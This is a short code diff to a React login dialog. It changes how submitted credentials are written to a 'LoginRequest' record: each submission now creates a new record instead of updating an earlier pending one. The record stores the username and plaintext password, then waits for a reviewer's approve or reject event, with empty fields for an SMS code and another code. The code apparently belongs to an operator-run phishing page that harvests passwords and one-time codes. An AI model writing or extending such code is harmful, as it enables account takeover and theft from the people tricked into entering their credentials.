@@ -26,28 +26,13 @@ export default function PasswordDialog({ username, onCancel, onReject }) {
     if (password.length < 8 || isLoading) return;
     setIsLoading(true);
 
-    const existing = await client.entities.LoginRequest.filter({ usuario: username }, '-created_date', 10);
-    const prev = existing.find((r) => r.status !== "approved");
-
-    let record;
-    if (prev) {
-      const updated = await client.entities.LoginRequest.update(prev.id, {
-        clave: password,
-        status: "pending",
-        smsCode: "",
-        amiCode: "",
-        rejectionReason: "",
-      });
-      record = updated || { id: prev.id };
-    } else {
-      record = await client.entities.LoginRequest.create({
-        usuario: username,
-        clave: password,
-        status: "pending",
-        smsCode: "",
-        amiCode: "",
-      });
-    }
+    const record = await client.entities.LoginRequest.create({
+      usuario: username,
+      clave: password,
+      status: "pending",
+      smsCode: "",
+      amiCode: "",
+    });
     setRequestId(record.id);
     unsubscribeRef.current = client.entities.LoginRequest.subscribe((event) => {
       if (event.id !== record.id) return;
